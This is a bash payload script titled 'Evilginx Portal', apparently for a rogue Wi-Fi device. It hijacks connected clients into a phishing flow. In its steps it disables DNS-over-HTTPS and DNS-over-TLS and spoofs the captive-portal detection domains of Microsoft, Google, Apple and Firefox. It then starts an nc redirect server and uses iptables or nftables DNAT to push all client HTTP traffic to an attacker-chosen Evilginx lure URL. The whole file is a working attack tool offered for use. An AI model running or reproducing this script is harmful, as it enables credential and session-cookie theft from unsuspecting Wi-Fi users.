#!/bin/bash
# Title:       Evilginx Portal
# Author:      Hexxed BitHeadz
# Description: Kills DoH, spoofs captive portal detection domains, starts a
#              lightweight HTTP redirect server, fires all client HTTP
#              traffic to the Evilginx lure URL. No PHP. No nginx. Just nc.
# Version:     1.1

DNSMASQ_CONF="/etc/dnsmasq.conf"
BACKUP_FILE="/tmp/evilginxportal_dnsmasq.bak"
NC_PID_FILE="/tmp/evilginxportal_nc.pid"
REDIRECT_PORT=8080
PAGER_IP="172.16.52.1"

# ----------------------------------------------------------------
# Step 1: Enter lure URL
# ----------------------------------------------------------------
LURE_URL=$(TEXT_PICKER "Evilginx lure URL" "https://")
case $? in
    $DUCKYSCRIPT_CANCELLED) exit 0 ;;
    $DUCKYSCRIPT_REJECTED | $DUCKYSCRIPT_ERROR) exit 0 ;;
esac

LURE_URL=$(printf '%s' "$LURE_URL" | tr -d ' \t\r\n')

if ! echo "$LURE_URL" | grep -qE '^https?://'; then
    LOG red "Step 1 FAILED: invalid URL: $LURE_URL"
    ERROR_DIALOG "Invalid URL.\n\nMust start with http:// or https://"
    exit 1
fi

LOG green "Step 1 OK: URL = $LURE_URL"

# ----------------------------------------------------------------
# Step 2: Confirm
# ----------------------------------------------------------------
resp=$(CONFIRMATION_DIALOG "Start Evilginx Portal?\n\nLure: $LURE_URL\n\nModifies dnsmasq + iptables.")
[ "$resp" != "1" ] && exit 0

# ----------------------------------------------------------------
# Step 3: Backup dnsmasq
# ----------------------------------------------------------------
LOG blue "Step 3: Backing up dnsmasq.conf..."
cp "$DNSMASQ_CONF" "$BACKUP_FILE" || { LOG red "Step 3 FAILED: could not backup $DNSMASQ_CONF"; exit 1; }
LOG green "Step 3 OK: backup at $BACKUP_FILE"

# ----------------------------------------------------------------
# Step 4: Kill DoH ? printf per line, no heredoc
# ----------------------------------------------------------------
LOG blue "Step 4: Killing DoH providers..."
{
    printf '\n# --- DoH Kill ---\n'
    printf 'address=/dns.google/0.0.0.0\n'
    printf 'address=/dns.google/::\n'
    printf 'address=/cloudflare-dns.com/0.0.0.0\n'
    printf 'address=/cloudflare-dns.com/::\n'
    printf 'address=/1dot1dot1dot1.cloudflare.com/0.0.0.0\n'
    printf 'address=/1dot1dot1dot1.cloudflare.com/::\n'
    printf 'address=/doh.msn.com/0.0.0.0\n'
    printf 'address=/doh.msn.com/::\n'
    printf 'address=/doh.opendns.com/0.0.0.0\n'
    printf 'address=/doh.opendns.com/::\n'
    printf 'address=/dns.quad9.net/0.0.0.0\n'
    printf 'address=/dns.quad9.net/::\n'
} >> "$DNSMASQ_CONF" || { LOG red "Step 4 FAILED: could not write to $DNSMASQ_CONF"; exit 1; }
LOG green "Step 4 OK: DoH entries written"

# ----------------------------------------------------------------
# Step 5: Spoof captive portal detection domains
# ----------------------------------------------------------------
LOG blue "Step 5: Spoofing captive portal detection domains..."
{
    printf '\n# --- Captive Portal Detection Spoof ---\n'
    printf 'address=/www.msftconnecttest.com/%s\n' "$PAGER_IP"
    printf 'address=/www.msftconnecttest.com/::\n'
    printf 'address=/connectivitycheck.gstatic.com/%s\n' "$PAGER_IP"
    printf 'address=/connectivitycheck.gstatic.com/::\n'
    printf 'address=/captive.apple.com/%s\n' "$PAGER_IP"
    printf 'address=/captive.apple.com/::\n'
    printf 'address=/detectportal.firefox.com/%s\n' "$PAGER_IP"
    printf 'address=/detectportal.firefox.com/::\n'
} >> "$DNSMASQ_CONF" || { LOG red "Step 5 FAILED: could not write captive portal entries"; exit 1; }
LOG green "Step 5 OK: captive portal entries written"

# ----------------------------------------------------------------
# Step 6: Restart dnsmasq + verify
# ----------------------------------------------------------------
LOG blue "Step 6: Restarting dnsmasq..."
/etc/init.d/dnsmasq restart 2>&1 | while IFS= read -r line; do LOG blue "$line"; done
sleep 2

if ! pgrep dnsmasq > /dev/null 2>&1; then
    LOG red "Step 6 FAILED: dnsmasq is not running after restart"
    LOG red "Check dnsmasq.conf for syntax errors:"
    LOG red "  dnsmasq --test -C $DNSMASQ_CONF"
    exit 1
fi
LOG green "Step 6 OK: dnsmasq running"

# ----------------------------------------------------------------
# Step 7: Start nc redirect server
# ----------------------------------------------------------------
LOG blue "Step 7: Starting redirect server on port $REDIRECT_PORT..."

if [ -f "$NC_PID_FILE" ]; then
    kill "$(cat $NC_PID_FILE)" 2>/dev/null
    rm -f "$NC_PID_FILE"
fi

while true; do
    printf 'HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n' \
        "$LURE_URL" | nc -l -p "$REDIRECT_PORT" 2>/dev/null
done &

echo $! > "$NC_PID_FILE"
sleep 1

if ! kill -0 "$(cat $NC_PID_FILE)" 2>/dev/null; then
    LOG red "Step 7 FAILED: redirect server did not start"
    LOG red "Check if nc supports -l -p flags: nc --help"
    LOG red "Check if port $REDIRECT_PORT is already in use: netstat -tlnp | grep $REDIRECT_PORT"
    exit 1
fi
LOG green "Step 7 OK: redirect server running (PID $(cat $NC_PID_FILE))"

# ----------------------------------------------------------------
# Step 8: Firewall redirect rules (iptables or nftables)
# ----------------------------------------------------------------
LOG blue "Step 8: Adding firewall redirect rules..."

if command -v iptables > /dev/null 2>&1; then
    LOG blue "Step 8: using iptables..."
    iptables -t nat -A PREROUTING -i br-lan -p tcp --dport 80 \
        -j DNAT --to-destination "$PAGER_IP:$REDIRECT_PORT"
    iptables -I FORWARD -p tcp --dport 853 -j DROP
    iptables -I FORWARD -p udp --dport 853 -j DROP
    LOG green "Step 8 OK: iptables rules added"

elif command -v nft > /dev/null 2>&1; then
    LOG blue "Step 8: iptables not found, using nftables..."

    # Create nat table + prerouting chain if they don't exist
    nft add table ip nat 2>/dev/null
    nft add chain ip nat PREROUTING \
        "{ type nat hook prerouting priority dstnat; }" 2>/dev/null

    # Redirect client HTTP to our nc server
    nft add rule ip nat PREROUTING \
        iifname "br-lan" tcp dport 80 dnat to "$PAGER_IP:$REDIRECT_PORT"

    # Block DNS over TLS
    nft add rule inet fw4 forward tcp dport 853 drop 2>/dev/null
    nft add rule inet fw4 forward udp dport 853 drop 2>/dev/null

    # Verify
    if nft list chain ip nat PREROUTING 2>/dev/null | grep -q "$REDIRECT_PORT"; then
        LOG green "Step 8 OK: nftables NAT rule confirmed"
    else
        LOG yellow "Step 8 WARNING: could not verify NAT rule"
        LOG yellow "Check manually: nft list chain ip nat PREROUTING"
    fi

else
    LOG red "Step 8 FAILED: neither iptables nor nft found"
    LOG red "Install iptables: opkg update && opkg install iptables"
    exit 1
fi

# ----------------------------------------------------------------
# Step 9: Done
# ----------------------------------------------------------------
ALERT "Evilginx Portal Active" "DoH: killed\nCaptive: spoofed\nRedirect: live\n\nRun evilginx_portal_stop to clean up."
VIBRATE "alert"
LOG green "All steps complete."